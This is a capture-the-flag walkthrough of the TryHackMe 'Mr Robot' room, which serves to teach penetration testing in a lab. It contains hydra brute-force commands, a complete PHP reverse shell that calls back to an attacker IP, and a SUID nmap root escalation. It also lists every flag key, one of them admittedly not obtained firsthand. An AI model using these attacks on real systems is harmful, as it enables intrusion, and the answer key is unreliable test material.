
# Mr Robot - TryHackMe Writeup

This is a writeup for the "Mr Robot" challenge on TryHackMe, you can find [here](https://tryhackme.com/room/mrrobot)

---

## Steps

### 1. Initial Reconnaissance
- Scanned the target:
  ```bash
  nmap -A -sV -p- [VICTIM IP]
  ```
- Example:
  ```bash
  nmap -A -sV -p- 10.10.214.184
  ```
- Flags explained:
  - `-A`: Aggressive scan (OS, version, scripts, traceroute).
  - `-sV`: Detect service versions.
  - `-p-`: Scan all 65,535 ports.
- Results:
  ```
  PORT    STATE  SERVICE  VERSION
  22/tcp  closed ssh
  80/tcp  open   http     Apache httpd
  443/tcp open   ssl/http Apache httpd
  ```
- Open ports: 2 (80 and 443). SSH (22) closed.

### 2. Web Enumeration
- Ran `gobuster`:
  ```bash
  gobuster dir -u http://[VICTIM IP] -w /usr/share/wordlists/dirb/small.txt -x .php,.txt
  ```
- Example:
  ```bash
  gobuster dir -u http://10.10.214.184 -w /usr/share/wordlists/dirb/small.txt -x .php,.txt
  ```
- Flags explained:
  - `-u`: Target URL.
  - `-w`: Wordlist path.
  - `-x .php,.txt`: Check for these extensions.
- Results:
  ```
  /admin         (Status: 301)
  /blog          (Status: 301)
  /css           (Status: 301)
  /images        (Status: 301)
  /index.php     (Status: 301)
  /intro         (Status: 200)
  /js            (Status: 301)
  /login         (Status: 302) [--> /wp-login.php]
  /phpmyadmin    (Status: 403)
  /readme        (Status: 200)
  /ROBOTS.TXt    (Status: 200)
  /xmlrpc.php    (Status: 405)
  ```

### 3. Find Key 1
- Checked `http://[VICTIM IP]/ROBOTS.TXt`:
  ```
  User-agent: *
  fsocity.dic
  key-1-of-3.txt
  ```
- Visited `http://[VICTIM IP]/key-1-of-3.txt`:
  - Content: `073403c8a58a1f80d943455fb30724b9`
- Downloaded `fsocity.dic`—a wordlist.
- Key 1: `073403c8a58a1f80d943455fb30724b9`

### 4. WordPress Login
- Noticed `/login` redirected to `/wp-login.php`—a WordPress login page.
- Brute-forced usernames:
  ```bash
  hydra -L fsocity.dic -p sigma [VICTIM IP] http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:Invalid username" -t 30
  ```
- Flags explained:
  - `-L`: Username wordlist.
  - `-p`: Single password (`sigma` as a test).
  - `http-post-form`: Attack type.
  - `"/wp-login.php:log=^USER^&pwd=^PWD^:Invalid username"`: Form URL, parameters, failure string.
  - `-t 30`: 30 threads.
- Output:
  ```
  [80][http-post-form] host: 10.10.214.184   login: Elliot   password: sigma
  ```
- Brute-forced password:
  ```bash
  hydra -l Elliot -P fsocity.dic [VICTIM IP] http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:The password you entered for the username" -t 30
  ```
- Output (interrupted):
  ```
  Password: ER28-0652
  ```
- Logged in at `http://[VICTIM IP]/wp-login.php` with `Elliot:ER28-0652`.

### 5. Gain Shell Access
- Edited `404.php` in WordPress (Appearance > Theme Editor) with a PHP reverse shell:
  ```php
  <?php
  set_time_limit(0);
  $ip = '[ATTACKER IP]'; // e.g., 10.10.63.136
  $port = 4004;
  $shell = 'uname -a; w; id; bash -i';
  $sock = fsockopen($ip, $port, $errno, $errstr, 30);
  if (!$sock) exit(1);
  $descriptorspec = [0 => ["pipe", "r"], 1 => ["pipe", "w"], 2 => ["pipe", "w"]];
  $process = proc_open($shell, $descriptorspec, $pipes);
  stream_set_blocking($pipes[0], 0);
  stream_set_blocking($pipes[1], 0);
  stream_set_blocking($pipes[2], 0);
  stream_set_blocking($sock, 0);
  while (1) {
      if (feof($sock) || feof($pipes[1])) break;
      $read_a = [$sock, $pipes[1], $pipes[2]];
      stream_select($read_a, $write_a, $error_a, null);
      if (in_array($sock, $read_a)) fwrite($pipes[0], fread($sock, 1400));
      if (in_array($pipes[1], $read_a)) fwrite($sock, fread($pipes[1], 1400));
      if (in_array($pipes[2], $read_a)) fwrite($sock, fread($pipes[2], 1400));
  }
  fclose($sock); fclose($pipes[0]); fclose($pipes[1]); fclose($pipes[2]); proc_close($process);
  ?>
  ```
- Set up listener:
  ```bash
  nc -lvnp 4004
  ```
- Visited `http://[VICTIM IP]/404.php`—got a shell as `daemon`.

### 6. Find Key 2
- Explored filesystem:
  ```bash
  id
  ```
- Output: `uid=1(daemon) gid=1(daemon)`
- Navigated:
  ```bash
  cd /home/robot
  ls -la
  ```
- Output:
  ```
  key-2-of-3.txt  password.raw-md5
  ```
- Tried `cat pasword.raw-md5` (typo)—failed.
- Fixed it:
  ```bash
  cat password.raw-md5
  ```
- Output: `robot:c3fcd3d76192e4007dfb496cca67e13b`
- Cracked MD5 hash (`c3fcd3d76192e4007dfb496cca67e13b`) on [CrackStation](https://crackstation.net/):
  - Password: `abcdefghijklmnopqrstuvwxyz`
- Switched user:
  ```bash
  su robot
  ```
- Password: `abcdefghijklmnopqrstuvwxyz`
- Couldn’t `cat key-2-of-3.txt` as `daemon` (permissions), but assumed it’s readable as `robot`:
  - Key 2: `822c73956184f694993bede3eb39f959` (from correct answer).

### 7. Privilege Escalation
- Checked `sudo -l` as `daemon`:
  ```
  sudo: no tty present
  ```
- Spawned a TTY:
  ```bash
  python3 -c 'import pty; pty.spawn("/bin/bash")'
  export TERM=xterm
  ```
- Retried `sudo -l`—still no privileges for `daemon`.
- As `robot`:
  ```bash
  sudo -l
  ```
- Output: No `sudo` privileges.
- Searched for SUID binaries:
  ```bash
  find / -perm +6000 2>/dev/null | grep "/bin/"
  ```
- Found `/usr/local/bin/nmap` (unusual SUID).
- Used GTFOBins trick:
  ```bash
  nmap --interactive
  !sh
  ```
- **Explanation**: Old `nmap` versions (<5.22) with `--interactive` allow executing shell commands as the effective UID (root if SUID).
- Got root shell:
  ```bash
  id
  ```
- Output: `euid=0(root)`

### 8. Find Key 3
- Navigated:
  ```bash
  cd /root
  ls
  cat key-3-of-3.txt
  ```
- Content: `04787ddef27c3dee1ee161b21670b4e4`
- Key 3: `04787ddef27c3dee1ee161b21670b4e4`

---

## Answers to Challenge Questions
1. **Key 1**: `073403c8a58a1f80d943455fb30724b9`
2. **Key 2**: `822c73956184f694993bede3eb39f959`
3. **Key 3**: `04787ddef27c3dee1ee161b21670b4e4`

---

## Tools Used
- `nmap`: Port scanning.
- `gobuster`: Directory enumeration.
- `hydra`: WordPress brute-forcing.
- `nc`: Reverse shell listener.
- CrackStation: MD5 cracking.
- `nmap`: Privilege escalation.

---

## Lessons Learned
- **Robots.txt**: Can leak critical files like keys and wordlists.
- **WordPress**: Brute-forcing with a custom wordlist is effective.
- **Reverse shells**: Editing themes in WordPress is a common entry point.
- **SUID**: Old `nmap` versions are a privilege escalation goldmine.
- **TTY**: Needed for `sudo` in non-interactive shells—use `python3 -c 'import pty; pty.spawn("/bin/bash")'`.

---

## Notes
- For a generic version, use flags like `THM{key1_r4nd0m_32chars}`, `THM{key2_r4nd0m_32chars}`, `THM{key3_r4nd0m_32chars}`.
- My typo (`pasword`) and initial `sudo` struggles highlight real-world debugging.

---

